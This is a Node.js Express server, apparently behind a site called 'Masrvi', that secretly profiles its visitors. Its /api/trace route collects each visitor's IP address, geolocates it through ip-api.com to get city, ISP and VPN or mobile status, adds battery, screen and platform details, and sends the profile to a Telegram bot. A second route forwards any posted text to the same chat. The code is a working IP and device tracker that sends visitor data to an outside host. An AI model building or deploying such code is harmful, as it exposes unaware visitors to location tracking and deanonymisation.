const express = require('express');
const path = require('path');
const fetch = require('node-fetch');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(path.join(__dirname, '.')));

// محاكاة Vercel API Endpoints لتعمل على Render
app.get('/api/trace', async (req, res) => {
    const { res: screenRes, lang, mem, cores, plat, bat } = req.query;
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const userAgent = req.headers['user-agent'];
    
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
        return res.status(500).send("Missing Config");
    }

    try {
        const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,isp,mobile,proxy`);
        const geo = await geoRes.json();

        const networkType = geo.mobile ? "📱 بيانات هاتف" : "🏠 واي فاي/ثابت";
        const vpnStatus = geo.proxy ? "⚠️ يستخدم VPN" : "✅ اتصال مباشر";

        const message = `🌐 **زيارة جديدة للموقع (Masrvi)** 🌐\n\n` +
                        `📍 **العنوان الرقمي:** \`${ip}\`\n` +
                        `🏢 **المزود:** ${geo.isp || 'غير معروف'}\n` +
                        `📡 **الشبكة:** ${networkType}\n` +
                        `🛡️ **الحماية:** ${vpnStatus}\n` +
                        `🌍 **الموقع:** ${geo.country}, ${geo.city}\n\n` +
                        `📱 **الجهاز:**\n` +
                        `• البطارية: ${bat || 'مخفية'}\n` +
                        `• الشاشة: ${screenRes}\n` +
                        `• النظام: ${plat}\n\n` +
                        `⏰ **التوقيت:** ${new Date().toLocaleString('ar-EG', {timeZone: 'Africa/Nouakchott'})}`;

        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
        });
    } catch (e) { console.error(e); }
    res.status(200).send("OK");
});

app.post('/api/send', async (req, res) => {
    const { text } = req.body;
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) return res.status(500).send("Missing Config");

    try {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: "Markdown" })
        });
        res.status(200).send("OK");
    } catch (e) { console.error(e); res.status(500).send("Error"); }
});

app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
